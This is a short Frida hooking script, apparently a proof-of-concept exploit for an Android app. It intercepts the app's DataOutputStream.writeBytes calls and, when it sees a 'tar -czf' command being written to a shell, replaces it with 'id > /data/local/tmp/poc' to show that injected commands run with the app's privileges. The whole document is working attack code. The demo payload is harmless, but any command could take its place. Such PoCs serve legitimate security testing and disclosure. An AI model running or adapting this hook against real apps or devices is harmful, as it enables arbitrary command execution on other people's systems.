Java.perform(function() {
    var DataOutputStream = Java.use("java.io.DataOutputStream")

    DataOutputStream.writeBytes.overload('java.lang.String').implementation = function(cmd) {
        if (cmd.indexOf("tar -czf") !== -1) {
            console.log(`[+] original cmd:  ${cmd}`)

            var modifiedCmd = "id > /data/local/tmp/poc\n"
            console.log("[!] check /data/local/tmp/poc")

            return this.writeBytes(modifiedCmd)
        }

        return this.writeBytes(cmd)
    }
})
